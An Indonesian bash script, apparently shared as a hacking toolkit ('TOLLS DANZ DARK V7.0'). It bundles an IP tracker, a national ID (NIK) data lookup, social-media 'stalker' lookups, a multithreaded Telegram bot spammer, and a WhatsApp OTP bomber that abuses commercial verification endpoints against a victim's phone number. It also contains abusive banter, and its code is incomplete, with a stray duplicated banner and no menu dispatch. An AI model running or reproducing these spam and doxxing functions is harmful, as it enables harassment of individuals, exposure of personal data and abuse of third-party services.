#!/bin/bash

# ===============================================
# 
#  #  TOLLS DANZ DARK VERSI V7.0  #
#     Plis Jangan di decode ya kontoll
# 
# ===============================================

# --- Variabel Warna ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
PURPLE='\033[0;35m'
NC='\033[0m'
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
C='\033[1;36m'
BG_RED='\033[41m' 

# --- Konfigurasi Keamanan ---
SECRET_ACCESS_KEY="danzX lamer" 

# Variabel Global untuk Spammer
global_token=""
global_chat_id=""
global_threads=""

# --- Pengecekan dan Instalasi Dependencies (Tetap) ---
check_dependencies() {
    local DEPENDENCIES=("curl" "jq" "wget" "git" "python3")
    local MISSING=()

    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            MISSING+=("$dep")
        fi
    done

    if [ ${#MISSING[@]} -ne 0 ]; then
        echo -e "\033[1;33m[!] Deteksi package yang belum terinstall:\033[0m" >&2
        for pkg in "${MISSING[@]}"; do
            echo -e "\033[0;31m - $pkg (belum ada)\033[0m" >&2
        done
        echo -e "\n\033[0;36mMenginstall package yang dibutuhkan...${NC}" >&2

        pkg_mgr=""
        if command -v apt &> /dev/null; then
            pkg_mgr="apt"
        elif command -v pkg &> /dev/null; then
            pkg_mgr="pkg"
        elif command -v yum &> /dev/null; then
            pkg_mgr="yum"
        fi

        if [ -z "$pkg_mgr" ]; then
            echo -e "${RED}[!] Gagal deteksi package manager. Install manual (misal: pkg install curl jq wget git python -y).${NC}" >&2
            exit 1
        fi

        for pkg in "${MISSING[@]}"; do
            echo -e "${BLUE}[+] Installing $pkg...${NC}" >&2
            if [[ "$pkg_mgr" == "apt" || "$pkg_mgr" == "yum" ]]; then
                if command -v sudo &> /dev/null; then
                    sudo $pkg_mgr install -y "$pkg" >&2
                else
                    $pkg_mgr install -y "$pkg" >&2
                fi
            else
                $pkg_mgr install -y "$pkg" >&2
            fi
        done
        
        if command -v pip3 &> /dev/null; then
            echo -e "${BLUE}[+] PIP3 ditemukan. Tool OSINT siap digunakan.${NC}" >&2
        else
            echo -e "${RED}[!] PIP3 tidak ditemukan. Instal python-pip atau python3-pip secara manual untuk OSINT.${NC}" >&2
        fi
    fi
}
# --- Akhir Pengecekan Dependencies ---


# 核心 Fungsi API: Mencetak JSON LENGKAP (TIDAK ADA RINGKASAN TERMINAL)
fetch_data_from_siputzx() {
    local API_URL=$1
    
    # Pesan ke stderr (terminal) agar tidak mengganggu output JSON
    echo -e "${CYAN}:: Mencoba mengambil data dari ${API_URL}...${NC}" >&2
    
    local RESPONSE=$(curl -s --max-time 15 "$API_URL")
    local CURL_STATUS=$?

    if [ "$CURL_STATUS" -ne 0 ] || [[ -z "$RESPONSE" ]]; then
        echo -e "${RED}[!] Gagal mengambil data. Error cURL/Timeout (Status: $CURL_STATUS).${NC}" >&2
        # Kembalikan JSON error yang valid jika gagal total
        echo '{"status":"error","message":"Gagal mengambil data dari API Siputzx/Baguss atau Timeout"}'
        return
    fi
    
    # [WAJIB] Cek dan Cetak respons dalam format JSON lengkap ke STDOUT
    local FORMATTED_RESPONSE=$(echo "$RESPONSE" | jq . 2>/dev/null)
    
    if [ $? -ne 0 ]; then
        # Jika jq gagal (respons bukan JSON), cetak pesan error ke stderr
        echo -e "${RED}[!] Respons API bukan JSON valid. Respons Mentah: ${RESPONSE}${NC}" >&2
        echo '{"status":"error","message":"Respons API tidak dalam format JSON yang diharapkan"}'
        return
    else
        # [OUTPUT UTAMA] Cetak JSON yang sudah terformat ke STDOUT
        echo -e "${YELLOW}--- [RESPONS JSON LENGKAP DAN TERFORMAT] ---${NC}" >&2
        echo "$FORMATTED_RESPONSE"
        echo -e "${YELLOW}--------------------------------------------${NC}" >&2
        return 0
    fi
}


# --- Fungsi Autentikasi Kunci (Tetap) ---
access_check() {
    clear
   echo -e "${RED}⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⠤⠴⠶⠶⠶⠶${NC}"
echo -e "${RED}⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠘⣉⢡⣤⡤⠐⣶⡆⢶⠀⣶⣶⡦${NC}"
echo -e "${RED}⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⣡⣴⣧⠻⣄⢸⣿⣿⡟⢁⡻⣸⣿⡿⠁${NC}"
echo -e "${RED}⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣷⣝⡳⠶⠶⠾⣛⣵⡿⠋⠀⠀${NC}"
echo -e "${RED}⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠀⠉⠒⠛⠀⠀⠀⠀⠀${NC}"
echo -e "${RED}⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
echo -e "${RED}⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
echo -e "${RED}⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
echo -e "${RED}⠀⠀⠀⠀⠀⠀⢻⡁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
echo -e "${RED}⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
echo -e "${RED}⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"
echo -e "${RED}⠀⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}"

    echo -e "   ${YELLOW}>>> AUTHENTICATION REQUIRED <<<${NC}"
    echo -e "---------------------------------"
    echo -e -n "${BLUE}Masukan Kunci key Anda » ${NC}"
    read INPUT_KEY
    
    if [[ "$INPUT_KEY" == "$SECRET_ACCESS_KEY" ]]; then
        echo -e "${GREEN}Akses berhasil Dibuka, Boss! Kita tidak pernah gagal!${NC}"
        sleep 1
        return 0
    else
        echo -e "${RED}Kunci Salah! Kembali ke penjara, KONTOL!${NC}"
        sleep 2
        exit 1
    fi 

}
# --- Fungsi Header/Banner (DIUBAH) ---
display_header() {
    clear
    
    echo -e "${BLUE}⣿⣿⣿⠛⠻⢿⣿⣿⣿⣷⣾⣝⡻⢿⣿⣯⣽⣹⡚⣽⣖⣺⣯⠭⣽⣿⣿⣉⠻⣙⣤⣾⠏   ⢛⣫⣶⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿ ⠑⢦⣤⣉⣉⠛⠛⡷⢿⡗⢉⣉⠉⣉⢍⣁⡒⢶⣶⣾⣩⠝⣫⣵⣿⣿⠿⣁⣠⣶  ⢿⣿⡿⠿⢛${NC}"
    echo -e "${BLUE}⣿⣿⡇   ⠙⠿⣿⣿⣿⡶⣢⣺⡿⣡⡾⣿⢧⡪⡹⢷⣍⠿⣟⡟⢟⢿⣽⡶⢊⣼⣿⣿⣀⡀ ⢰⣾⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣷ ⠈⢿⣿⣕⠻⢿⢋⣾⢷⡏⣼⣿⠇⣿⡘⣷⡹⣮⡻⣷⡙⣷⣌⠮⢋⣴⣿⣿⣿⣿⣿⣿⠗⣸⣿⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⡄⣠⣾⣿⣿⡿⡲⢣⡿⡏⣰⣿⡿⠈⣿⡇⢿⣷⠹⠷⣈⢾⡞⠿⣶⣘⠻⣿⣿⣿⣿⣷⣆ ⣿⣿⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⣧⠉⣹⣿⡷⠐⣕⢏⢼⢣⣷⣝⢃⢣⡿⡇⢘⣭⣆⣿⠟⣥⠳⡜⡝⢿⣧⡹⣿⣿⡿⣯⠋ ⣿⣿⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⣧⠸⠿⣿⡁⣾⢡⣞⡦⢈⢿⡟⡎⣼⣶⠇⣿⣿⠿⡐⢿⣻⣧⡹⡌⢎⢿⡧⡈⠁   ⣰⣿⣿⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⣿⣿⡆⢀⣼⠇⣾⡾⡅⢸⡎⠜⢘⠻⣣⢏ ⣵⣿⡟⠎⠿⠿⣷⣡⠃⡱⡨⣞⣇ ⢰⡀⢹⣿⣿⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⣿⣿⠁⢠⡟⢠⣿⣿⢠⠘ ⠄⡌⣿⣿⢸⡄⣯⡶⢀⣿⣆⢙⢿⣕⠪⣶⡕⠝⣿⡈⠌⡇⢹⣿⣿⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⣿⡿ ⢾⠇⢼⣿⢟⠈⣄⠲⡇⡇⣿⠛⣼⡇⣿⠃⡨⠛⠉⠉ ⠐ ⣿⣿⣎⢪⣧⠘⢠⠸⣿⣿⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⣿⡇⠈⢸⠘⣼⡿⣿⠐⠛⡀⠁⠒⠉⢰⣿⠇⣱⣧⣷⣿⢂⠰⡤⢉⡄⣿⣟⣿⠈⣿⠠⡘⡀⢿⣿⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⣿⣧ ⢸⡇⢾⣿⡄⢀⢺⡗⣦⣀⢸⣿⣿⣿⣿⣿⣿⣿⣮⣭⣵⣿⢸⣿⣿⢿⡆⣯⠁⠄⡇⠸⣿⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⣿⡇ ⠘⡅⣺⢯⡇⠈⢷⣽⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⡟⣸⢯⡟⡆⣿⠰⢐⠘⡀⢿⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⣿⣷  ⢳⢸⢯⡇⢰⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡼⠁⡿⣯⢁⡇⢾ ⡌ ⠐⠘⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⣿⣿ ⡐⠈⠸⣏⡇ ⠁⠹⣿⣿⣿⣿⣿⣿⣛⣿⣿⣿⣿⣿⠑⠁⡸⢻⡍⢸ ⢸⡂⠱ ⠇ ⣿⣿${NC}"
    echo -e "${BLUE}⣿⣿⣿⣿⠏⢠⡝⠱⡀⡻⣼ ⠐ ⠊⠛⠿⣿⣿⣿⣿⣿⣿⣿⠿⠃⡀⠠⢡⡟ ⡿ ⢸ ⠃⠄ ⡀⢸⣿${NC}"
    echo -e "${BLUE}⡟⡻⢛⡡⠊⣠⠇ ⡗⢸⢱ ⢶⣶⠂⣤⣤⣀⡉⠛⠿⢟⡫⠕⣊⢠⡄⢠⡗ ⣸⠱ ⡐⠆⠁⢢ ⠁⢸⣿${NC}"
    echo -e "${BLUE}⣷⣦⡄ ⣜⠃ ⢠⠘⠆⠂⢇ ⠉ ⠾⣟⣿⢿⣷⣦⣥⣒⠿⠇⠈⡄⠞⡐⢀⣃⣃⡀⠑⠖ ⠩⡄⠂⢸⣿${NC}"
    echo -e "${BLUE}⣿⣿⡃⡜⢡⢂ ⣸⢸⢀⠃⠈⡜⡙⡄⢠⣤⣈⡉⠙⠋⠻⠿⠿⡆⠸⡅⠸⢡⢀⡤⠖⠰⢿⣆  ⠈  ⣿${NC}"
    echo -e "${BLUE}⣿⣿⢁⠃⠸⡌⢰⡱⠈⢀⠺⠿⣦⡘⠃⢸⣿⣻⡿⣿⠷⣶⣶⡤⡄⠓⡇⠡⠊⢠⠶⠗⠖⢿⡟⡄  ⢀⣴⣿${NC}"
    echo -e "${NC}"
    
    # [ INFORMATION TOOLS ]
    echo -e "${RED}[ INFORMATION TOOLS ]${NC}"
    echo -e "├── ${WHITE}GITHUB    : GAADA${NC}"
    echo -e "├── ${WHITE}TELEGRAM  : t.me/danzXcrash${NC}"
    echo -e "├── ${WHITE}VERSION   : V7.0 ${NC}"
    echo -e "└── ${WHITE}DATE      : $(date +%d/%m/%Y)${NC}"
    echo -e 
}

    
    # [ INFORMATION TOOLS ]
    echo -e "${RED}[ INFORMATION TOOLS ]${NC}"
    echo -e "├── ${WHITE}GITHUB    : GAADA${NC}"
    echo -e "├── ${WHITE}TELEGRAM  : t.me/danzXcrash${NC}"
    echo -e "├── ${WHITE}VERSION   : V7.0 ${NC}"
    echo -e "└── ${WHITE}DATE      : $(date +%d/%m/%Y)${NC}"
    echo -e 


# --- Fungsi Menu Utama (DIUBAH UNTUK MENAMBAH MENU 11) ---
display_menu() {
    display_header
    echo -e "⇒ ⇒ ${YELLOW}WELCOME TOOLS DANZ V7.0 (MODE ON)${NC} ⇐ ⇐"
    echo -e 
    echo -e "${BLUE}[01] ${CYAN}${NC}CEK IP » ${GREEN}Track the location ip${NC}"
    echo -e "${BLUE}[02] ${CYAN}${NC}NIK PARSE » ${GREEN}Searching for complete data NIK${NC}"
    echo -e "${BLUE}[03] ${CYAN}${NC}OSINT » ${GREEN}Advance Social Media OSINT${NC}"
    echo -e "${BLUE}[04] ${CYAN}${NC}GH Stalker » ${GREEN}Stalking user GitHub"
    echo -e "${BLUE}[05] ${CYAN}${NC}IG Stalker » ${GREEN}Stalking user Instagram${NC}"
    echo -e "${BLUE}[06] ${CYAN}${NC}YT Stalker » ${GREEN}Stalking channel YouTube${NC}"
    echo -e "${BLUE}[07] ${CYAN}${NC}TT Stalker » ${GREEN}Stalking user TikTok (down API)${NC}" 
    echo -e "${BLUE}[08] ${CYAN}${NC}TT Stalker » ${GREEN}Stalking user TikTok (Fresh API)${NC}" 
    echo -e "${BLUE}[09] ${CYAN}${NC}SPAM TELEGRAM » ${GREEN}Spam bot tele${NC}" 
    echo -e "${BLUE}[10] ${CYAN}${NC}SPAM OTP WHATSAPP » ${GREEN}Spam OTP Wa${NC}" 
    echo -e "${BLUE}[11] ${CYAN}${NC}TT DOWNLOADER » ${GREEN}TikTok Downloader${NC}" # BARU
    echo -e "${BLUE}[99] ${CYAN}${NC}Exit${NC}  » ${GREEN}Close program${NC}"
    echo -e 
    echo -e "\n${GREEN}${NC}"
    echo -e -n "\n${BLUE}PILIH MENU » ${NC}"
}

# --- Fungsi 01: Cek IP Asli (Dipertahankan, tetapi JSON utama yang ditampilkan) ---
check_ip_real() {
    clear
    echo -e "${RED}--- [01] IP Location Tracker (Rill API) ---${NC}" >&2
    echo -e -n "${BLUE}Masukan IP Target » ${NC}" >&2
    read IP_TARGET

    if [[ -z "$IP_TARGET" ]]; then
        echo -e "${RED}IP Target tidak boleh kosong!${NC}" >&2
        sleep 2
        return
    fi

    echo -e "${CYAN}:: Melacak IP ${IP_TARGET} menggunakan API IP-API.com...${NC}" >&2
    
    IP_API_URL="http://ip-api.com/json/$IP_TARGET?fields=country,city,isp,query,status,message,lat,lon,timezone"
    RESPONSE=$(curl -s --max-time 10 "$IP_API_URL")
    
    # Cetak JSON Mentah IP-API (WAJIB: JSON LENGKAP)
    echo -e "${YELLOW}--- [RESPONS JSON LENGKAP DARI API IP-API] ---${NC}" 
    echo "$RESPONSE" | jq . 2>/dev/null
    echo -e "${YELLOW}---------------------------------------------${NC}" 

    read -p "${CYAN}Tekan ENTER untuk kembali ke menu...${NC}" >&2
}

# --- Fungsi 02: NIK PARSE (OUTPUT JSON SAJA) ---
nik_hack_attempt() {
    clear
    echo -e "${RED}--- [02] NIK Data Check (API Siputzx) - JSON MAX ---${NC}" >&2
    echo -e -n "${BLUE}Masukan NIK Target (16 Digit) » ${NC}" >&2
    read NIK_TARGET
    
    if [[ ! "$NIK_TARGET" =~ ^[0-9]{16}$ ]]; then
        echo -e "${RED}Format NIK tidak valid. Harus 16 digit angka.${NC}" >&2
        sleep 2
        return
    fi
    
    NIK_API_URL="https://api.siputzx.my.id/api/tools/nik-checker?nik=${NIK_TARGET}"
    fetch_data_from_siputzx "$NIK_API_URL" # Mencetak JSON ke STDOUT
    
    read -p "${CYAN}Tekan ENTER untuk kembali ke menu...${NC}" >&2
}

# --- Fungsi 04: GitHub Stalker (OUTPUT JSON SAJA) ---
github_stalker() {
    clear
    echo -e "${CYAN}--- [04] GitHub Stalker (API Siputzx) - JSON MAX ---${NC}" >&2
    echo -e -n "${BLUE}Masukan Username GitHub Target » ${NC}" >&2
    read GH_USER
    
    if [[ -z "$GH_USER" ]]; then
        echo -e "${RED}Username tidak boleh kosong!${NC}" >&2
        sleep 2
        return
    fi
    
    GH_API_URL="https://api.siputzx.my.id/api/stalk/github?user=${GH_USER}"
    fetch_data_from_siputzx "$GH_API_URL" # Mencetak JSON ke STDOUT
    
    read -p "${CYAN}Tekan ENTER untuk kembali ke menu...${NC}" >&2
}

# --- Fungsi 05: Instagram Stalker (OUTPUT JSON SAJA) ---
instagram_stalker() {
    clear
    echo -e "${PURPLE}--- [05] Instagram Stalker (API Siputzx) - JSON MAX ---${NC}" >&2
    echo -e -n "${BLUE}Masukan Username Instagram Target » ${NC}" >&2
    read IG_USER
    
    if [[ -z "$IG_USER" ]]; then
        echo -e "${RED}Username tidak boleh kosong!${NC}" >&2
        sleep 2
        return
    fi
    
    IG_API_URL="https://api.siputzx.my.id/api/stalk/instagram?username=${IG_USER}"
    fetch_data_from_siputzx "$IG_API_URL" # Mencetak JSON ke STDOUT
    
    read -p "${CYAN}Tekan ENTER untuk kembali ke menu...${NC}" >&2
}

# --- Fungsi 06: YouTube Stalker (OUTPUT JSON SAJA) ---
youtube_stalker() {
    clear
    echo -e "${GREEN}--- [06] YouTube Stalker (API Siputzx) - JSON MAX ---${NC}" >&2
    echo -e -n "${BLUE}Masukan Username/Custom URL YouTube Target » ${NC}" >&2
    read YT_USER
    
    if [[ -z "$YT_USER" ]]; then
        echo -e "${RED}Username/URL tidak boleh kosong!${NC}" >&2
        sleep 2
        return
    fi
    
    YT_API_URL="https://api.siputzx.my.id/api/stalk/youtube?username=${YT_USER}"
    fetch_data_from_siputzx "$YT_API_URL" # Mencetak JSON ke STDOUT
    
    read -p "${CYAN}Tekan ENTER untuk kembali ke menu...${NC}" >&2
}

# --- Fungsi 07: TikTok Stalker (Siputzx API) - (DIUBAH NAMA) ---
tiktok_stalker_siputzx() {
    clear
    echo -e "${GREEN}--- [07] TikTok Stalker (API Siputzx) - JSON MAX ---${NC}" >&2
    echo -e -n "${BLUE}Masukan Username TikTok Target » ${NC}" >&2
    read TT_USER
    
    if [[ -z "$TT_USER" ]]; then
        echo -e "${RED}Username tidak boleh kosong!${NC}" >&2
        sleep 2
        return
    fi
    
    TT_API_URL="https://api.siputzx.my.id/api/stalk/tiktok?username=${TT_USER}"
    fetch_data_from_siputzx "$TT_API_URL" # Mencetak JSON ke STDOUT
    
    read -p "${CYAN}Tekan ENTER untuk kembali ke menu...${NC}" >&2
}

# --- FUNGSI BARU 08: TikTok Stalker (Baguss API) - OUTPUT JSON SAJA ---
tiktok_stalker_baguss() {
    clear
    echo -e "${GREEN}--- [08] TikTok Stalker (API Baguss.xyz) - JSON MAX ---${NC}" >&2
    echo -e -n "${BLUE}Masukan Username TikTok Target » ${NC}" >&2
    read TT_USER_BAGUSS
    
    if [[ -z "$TT_USER_BAGUSS" ]]; then
        echo -e "${RED}Username tidak boleh kosong!${NC}" >&2
        sleep 2
        return
    fi
    
    TT_API_URL="https://api.baguss.xyz/api/stalker/tiktok?username=${TT_USER_BAGUSS}"
    fetch_data_from_siputzx "$TT_API_URL" # Menggunakan fungsi fetch_data_from_siputzx untuk fetching dan mencetak JSON
    
    read -p "${CYAN}Tekan ENTER untuk kembali ke menu...${NC}" >&2
}

# --- FUNGSI BARU 11: TikTok Downloader (Membuka URL) ---
tiktok_downloader_menu() {
    local DOWNLOAD_URL="https://link-tiktok-download.vercel.app/"
    clear
    echo -e "${RED}--- [11] TikTok Downloader (URL Browser) ---${NC}" >&2
    echo -e "${GREEN}:: Membuka link TikTok Downloader di browser Anda...${NC}" >&2
    
    # Mencoba membuka URL menggunakan xdg-open (Linux/Termux) atau perintah lain
    if command -v xdg-open &> /dev/null; then
        xdg-open "$DOWNLOAD_URL" >/dev/null 2>&1
    elif command -v termux-open-url &> /dev/null; then
        termux-open-url "$DOWNLOAD_URL" >/dev/null 2>&1
    elif command -v open &> /dev/null && [[ "$(uname)" == "Darwin" ]]; then
        open "$DOWNLOAD_URL" >/dev/null 2>&1
    elif command -v gnome-open &> /dev/null; then
        gnome-open "$DOWNLOAD_URL" >/dev/null 2>&1
    elif command -v sensible-browser &> /dev/null; then
        sensible-browser "$DOWNLOAD_URL" >/dev/null 2>&1
    else
        echo -e "${RED}[!] Gagal membuka browser. Tidak dapat menemukan perintah 'xdg-open' atau sejenisnya.${NC}" >&2
        echo -e "${YELLOW}Silakan buka manual link berikut: ${DOWNLOAD_URL}${NC}" >&2
    fi

    echo -e "${CYAN}Link: ${DOWNLOAD_URL}${NC}" >&2
    read -p "${CYAN}Tekan ENTER untuk kembali ke menu...${NC}" >&2
}
# =======================================================


# =======================================================
# --- FUNGSI 09 (SHIFTED): TELEGRAM BOT SPAMMER (TIDAK ADA PERUBAHAN) ---
# =======================================================

function telegram_spammer_banner() {
    clear
    echo -e "${CYAN}"
    cat << 'EOF'
 ___  ____   __    __  __    ____  ____  __    ____
/ __)(  _ \ /__\  (  \/  )  (_  _)( ___)(  )  ( ___)
\__ \ )___//(__)\  )    (     )(   )__)  )(__  )__)
(___/(__) (__)(__)(_/\/\_)   (__) (____)(____)(____)
EOF
    echo -e "${NC}"
    echo -e "${BLUE}   Telegram Bot Spammer Tool By ~ danzX${NC}"
    echo -e "${BLUE}            Spam terus brooo 🗿👍 ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

function validate_integer() {
    local input="$1"
    if [[ "$input" =~ ^[1-9][0-9]*$ ]]; then
        echo 1
    else
        echo 0
    fi
}

function prompt_token() {
    while true; do
        read -p "Token Bot: " token
        if [[ -z "$token" ]]; then
            echo -e "${RED}Token tidak boleh kosong! Coba lagi.${NC}"
        else
            global_token="$token"
            break
        fi
    done
}

function prompt_chat_id() {
    while true; do
        read -p "Chat ID: " chat_id
        if [[ -z "$chat_id" ]]; then
            echo -e "${RED}Chat ID tidak boleh kosong! Coba lagi.${NC}"
        elif ! [[ "$chat_id" =~ ^-?[0-9]+$ ]]; then
            echo -e "${RED}Chat ID harus berupa angka! Coba lagi.${NC}"
        else
            global_chat_id="$chat_id"
            break
        fi
    done
}

function prompt_threads() {
    while true; do
        read -p "Jumlah Threads (misal 1/detik): " threads
        valid=$(validate_integer "$threads")
        if [[ "$valid" -eq 1 ]]; then
            global_threads="$threads"
            break
        else
            echo -e "${RED}Jumlah Threads harus berupa bilangan bulat positif! Coba lagi.${NC}"
        fi
    done
}

function prompt_pesan_jumlah() {
    local message
    local jumlah
    while true; do
        read -p "Pesan: " message
        if [[ -z "$message" ]]; then
            echo -e "${RED}Pesan tidak boleh kosong! Coba lagi.${NC}"
        else
            break
        fi
    done

    while true; do
        read -p "Jumlah Pesan (angka): " jumlah
        valid=$(validate_integer "$jumlah")
        if [[ "$valid" -eq 1 ]]; then
            break
        else
            echo -e "${RED}Jumlah Pesan harus berupa bilangan bulat positif! Coba lagi.${NC}"
        fi
    done

    echo "$message|$jumlah"
}

function send_message() {
    local token="$1"
    local chat_id="$2"
    local message="$3"
    local encoded_message=$(echo "$message" | sed 's/ /%20/g')
    curl -s -X POST "https://api.telegram.org/bot${token}/sendMessage" \
         -d "chat_id=${chat_id}" \
         -d "text=${encoded_message}" > /dev/null
}

function send_messages_concurrent() {
    local token="$1"
    local chat_id="$2"
    local message="$3"
    local jumlah="$4"
    local threads="$5"
    local count=0

    echo -e "\n${YELLOW}Mengirim ${jumlah} pesan dengan ${threads} thread...${NC}" >&2
    for (( i=1; i<=jumlah; i++ )); do
        send_message "$token" "$chat_id" "$message" &
        echo -ne "${GREEN}[${i}/${jumlah}] Pesan terkirim!\\r${NC}" >&2
        ((count++))
        if (( count % threads == 0 )); then
            wait
        fi
    done
    wait
    echo -e "\n${CYAN}Selesai mengirim ${jumlah} pesan.${NC}" >&2
}

function telegram_bot_spammer() {
    local message_data

    while true; do
        telegram_spammer_banner >&2

        if [[ -z "$global_token" || -z "$global_chat_id" || -z "$global_threads" ]]; then
            echo -e "${BLUE}Input data lengkap terlebih dahulu:${NC}" >&2
            prompt_token
            prompt_chat_id
            prompt_threads
        fi

        message_data=$(prompt_pesan_jumlah)
        local message=$(echo "$message_data" | cut -d '|' -f 1)
        local jumlah=$(echo "$message_data" | cut -d '|' -f 2)

        send_messages_concurrent "$global_token" "$global_chat_id" "$message" "$jumlah" "$global_threads"

        echo -e "\n${CYAN}Pilih opsi selanjutnya:${NC}" >&2
        echo -e "${CYAN}[u] Input ulang data lengkap (token, chat id, threads)${NC}" >&2
        echo -e "${CYAN}[y] Kirim ulang pesan dengan data sebelumnya${NC}" >&2
        echo -e "${CYAN}[n] Kembali ke menu utama (Tools Danz)${NC}" >&2

        while true; do
            read -p "Opsi (u/y/n): " opsi
            case "$opsi" in
                n)
                    return 0
                    ;;
                u)
                    global_token=""
                    global_chat_id=""
                    global_threads=""
                    break
                    ;;
                y)
                    break
                    ;;
                *)
                    echo -e "${RED}Opsi tidak valid! Masukkan u, y, atau n.${NC}" >&2
                    ;;
            esac
        done
    done
}
# =======================================================


# =======================================================
# --- FUNGSI 10 (SHIFTED): SPAM OTP WHATSAPP (TIDAK ADA PERUBAHAN) ---
# =======================================================

color() {
  local color_code=$1
  local text=$2

  case "$color_code" in
    red)    printf "${RED}%s${NC}\n" "$text" ;;
    green)  printf "${GREEN}%s${NC}\n" "$text" ;;
    yellow) printf "${YELLOW}%s${NC}\n" "$text" ;;
    blue)   printf "${BLUE}%s${NC}\n" "$text" ;;
    magenta)printf "${PURPLE}%s${NC}\n" "$text" ;;
    cyan)   printf "${CYAN}%s${NC}\n" "$text" ;;
    white)  printf "${WHITE}%s${NC}\n" "$text" ;;
    *)      printf "%s${NC}\n" "$text" ;;
  esac
}

codex() {
  local length=$1
  tr -dc A-Za-z0-9 </dev/urandom | head -c "$length"
}

fetch_value() {
  local response=$1
  local start_string=$2
  local end_string=$3

  local start_index=$(expr index "$response" "$start_string")
  if [ "$start_index" -eq 0 ]; then
    return
  fi

  start_index=$((start_index + ${#start_string}))
  local remaining_string="${response:$start_index}"
  local end_index=$(expr index "$remaining_string" "$end_string")

  if [ "$end_index" -eq 0 ]; then
    return
  fi

  end_index=$((end_index - 1))
  printf "%s\n" "${remaining_string:0:$end_index}"
}
# --- END UTILITY FUNCTIONS ---

# --- OTP SERVICE FUNCTIONS ---
bisatopup() {
  local nomor=$1
  local device_id=$(codex 16)
  local url="https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id=${device_id}&version_name=6.12.04&version=61204"
  local payload="phone_number=$nomor"
  local response=$(curl -s -X POST -d "$payload" -H "Content-Type: application/x-www-form-urlencoded" "$url")
  local result=$(fetch_value "$response" '"message":"' '","')
  if [ "$result" == "OTP akan segera dikirim ke perangkat" ]; then
    color red "BISATOPUP: Spam Whatsapp Ke $nomor (Terkirim)" >&2
    return 0
  else
    color yellow "BISATOPUP: $response" >&2
    return 1
  fi
}
titipku() { local nomor=$1; local url="https://titipku.tech/v1/mobile/auth/otp?method=wa"; local payload="{\"phone_number\": \"+62$nomor\", \"message_placeholder\": \"hehe\"}"; local response=$(curl -s -X POST -d "$payload" -H "Content-Type: application/json; charset=UTF-8" "$url"); local result=$(fetch_value "$response" '"message":"' '","'); if [ "$result" == "otp sent" ]; then color red "TITIPKU: Spam Whatsapp Ke $nomor (Terkirim)" >&2; return 0; else color yellow "TITIPKU: $response" >&2; return 1; fi }
